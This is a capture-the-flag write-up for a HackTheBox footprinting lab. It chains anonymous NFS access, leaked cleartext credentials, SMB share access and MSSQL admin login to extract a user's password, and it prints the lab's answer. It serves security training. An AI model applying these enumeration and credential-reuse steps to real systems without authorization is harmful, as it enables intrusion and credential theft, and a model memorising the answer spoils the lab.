
# Footprinting Medium Lab
## Question.
> Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.

---

## Task Goal

The objective of this task is to enumerate the target server and chained services in order to:

1. Discover exposed network services
2. Extract credentials from misconfigured services
3. Use the credentials to access SMB shares
4. Enumerate an MSSQL database
5. Find the user **HTB** and extract its password

---

## 1 — Initial Enumeration
Command.
```
nmap -sT -sV -sU -A -O 10.129.4.15
```
<img width="585" height="652" alt="image" src="https://github.com/user-attachments/assets/59774937-762c-406e-8084-0533bb469bf1" />


### What is shown

Nmap scan results against the target host showing multiple open services.

---

### Key services identified

```text
111/tcp   rpcbind
2049/tcp  nlockmgr (NFS-related)
135/tcp   msrpc
139/tcp   netbios-ssn
445/tcp   microsoft-ds (SMB)
3389/tcp  ms-wbt-server (RDP)
5985/tcp  http (WinRM / HTTPAPI)
```

---

### Explanation

The presence of **rpcbind (111)** and **nlockmgr (2049)** strongly suggests **NFS** is running.
SMB (445) and MSSQL-related services are also available, indicating a Windows server with file sharing and database services.

---

## 2 — Enumerating NFS Exports

### Command executed

```bash
showmount -e 10.129.4.15
```
<img width="262" height="98" alt="image" src="https://github.com/user-attachments/assets/3c270eed-2004-4249-974b-7ef0a4bdf499" />

---

### Output

```text
Export list for 10.129.4.15:
/TechSupport (everyone)
```

---

### Explanation

The NFS export `/TechSupport` is shared with **everyone**, meaning it can be mounted without authentication.

---

##  3 — Mounting the NFS Share

### Commands executed

```bash
mkdir target-nfs
mount -t nfs 10.129.4.15:/ ./target-nfs/ -o nolock
cd target-nfs/TechSupport
ls -lha
```
<img width="461" height="272" alt="image" src="https://github.com/user-attachments/assets/8faa8672-e3a5-450d-88ab-4599862049b0" />

---
<img width="580" height="23" alt="image" src="https://github.com/user-attachments/assets/5d940312-811b-4340-8ff1-939979bd0e2a" />

### Output

```text
-rwx------ 1 nobody nogroup 1.3K ticket4238791283782.txt
```

---

### Explanation

Inside the NFS share, a support ticket file is found. This file is likely to contain internal or sensitive information.

---

##  4 — Reading the Ticket File

### Command executed

```bash
cat ticket4238791283782.txt
```
<img width="483" height="453" alt="image" src="https://github.com/user-attachments/assets/9fbc41fe-f4ca-4ad0-8bff-e0aa61b35a66" />

---

### Important contents found

```text
user="alex"
password="lol123!mD"
host=smtp.web.dev.inlanefreight.htb
```

---

### Explanation

The support ticket contains **cleartext credentials** for user `alex`.
These credentials can now be tested against other exposed services.

---

## 5 — SMB Enumeration Using Discovered Credentials

### Command executed

```bash
smbmap -H 10.129.6.121 -u alex -p 'lol123!mD'
```
<img width="769" height="482" alt="image" src="https://github.com/user-attachments/assets/f3d78baa-7f6c-40f0-93f5-b65f95d642fc" />

---

### Output

```text
devshare   READ, WRITE
```

---

### Explanation

The credentials successfully authenticate to SMB.
The share **devshare** has **read and write permissions**, making it a high-value target.

---

##  6 — Accessing the SMB Share

### Command executed

```bash
smbclient //10.129.6.121/devshare -U alex
```
<img width="832" height="249" alt="image" src="https://github.com/user-attachments/assets/7cd86569-053a-49db-9482-df1fc8aa28a6" />

Then:

```bash
ls
get important.txt
```

---

### Explanation

A file named `important.txt` is downloaded from the SMB share for local inspection.

---

## 7 — Extracting Database Credential from SMB File

### Command executed

```bash
cat important.txt
```
<img width="316" height="70" alt="image" src="https://github.com/user-attachments/assets/baa70fa0-8b2e-49ae-9fe9-14d9305df02e" />

---

### Output

```text
sa:87N1ns0sJLls83
```

---

### Explanation

The file contains **SQL Server administrator credentials** (`sa` account).
These credentials allow full access to MSSQL.

---


## 8 — Launching SSMS with Elevated Privileges

### What is happening

The **Microsoft SQL Server Management Studio** application is launched using:

```
Run as administrator
```
<img width="415" height="469" alt="image" src="https://github.com/user-attachments/assets/6707d083-9eb8-49e9-896c-d81a11314695" />

---

### Why this matters

Running SSMS as Administrator ensures:

* Full access to local SQL Server instances
* No permission issues when connecting using Windows Authentication
* Ability to enumerate all databases and system objects

---

## 9 — User Account Control (UAC) Prompt

### What is shown

A UAC confirmation dialog requesting permission to run SSMS with elevated rights.
Use sa:``87N1ns0sJLls83`` as password 
<img width="525" height="528" alt="image" src="https://github.com/user-attachments/assets/1488fe2a-7074-4937-87d3-6d5448f5ef5c" />

---

### Explanation

This confirms:

* The application is being run with administrator privileges
* The session will inherit full Windows permissions

---

## 10 — Connecting to SQL Server

### Connection details shown
<img width="868" height="481" alt="image" src="https://github.com/user-attachments/assets/893df470-4f87-4664-86dd-4d31a5177b9d" />

```text
Server type: Database Engine
Server name: WINMEDIUM
Authentication: Windows Authentication
User: WINMEDIUM\Administrator
```

---

### Explanation

SSMS connects to the local SQL Server instance using **Windows Authentication**, which works because:

* The current user is a local administrator
* SQL Server trusts Windows credentials

No password is required at this stage.

---

## 11 — Viewing Table Contents

### Action taken

Right-click on `dbo.devssacc` → **Select Top 200 Rows**
<img width="412" height="334" alt="image" src="https://github.com/user-attachments/assets/a4d5d469-4845-43cd-8d05-2b4934381c3e" />

---

### Explanation

This action executes a SQL query in the background:

```sql
SELECT TOP (200) * FROM accounts.dbo.devssacc;
```


It retrieves the contents of the table for inspection.
---

## 12 — Enumerating Tables Inside accounts Database

### What is shown

Navigation path:

```text
Databases → accounts → Tables
```

---

### Explanation

Expanding the **Tables** node reveals database tables that store structured data.

---

## 13 — Selecting the devssacc Table
<img width="920" height="614" alt="image" src="https://github.com/user-attachments/assets/05570667-b02c-4ac0-a845-2931ab31046c" />

### What is shown

The table:

```text
dbo.devssacc
```

is selected.

---

### Explanation

The table name suggests it may store **developer or service account information**.

---

## 14 — Identifying User HTB

### What is shown

The query results display:

```text
name: HTB
password: lnch7ehrdn43i7AoqVPK4zWR
```

---

### Explanation

The credentials are stored **in cleartext**, which is a severe security misconfiguration.

The row corresponding to user **HTB** reveals the required password.

---

## Final Answer

```
lnch7ehrdn43i7AoqVPK4zWR
```
## One More Way To Find Flag

<img width="808" height="421" alt="image" src="https://github.com/user-attachments/assets/b959ac5f-eaad-4847-90e9-82c40a246ea1" />

---

## Attack Chain Summary

```text
NFS (anonymous) 
→ Support ticket leak 
→ SMB credentials 
→ SMB file disclosure 
→ MSSQL admin access 
→ Credential extraction
```

---



Just say the word.
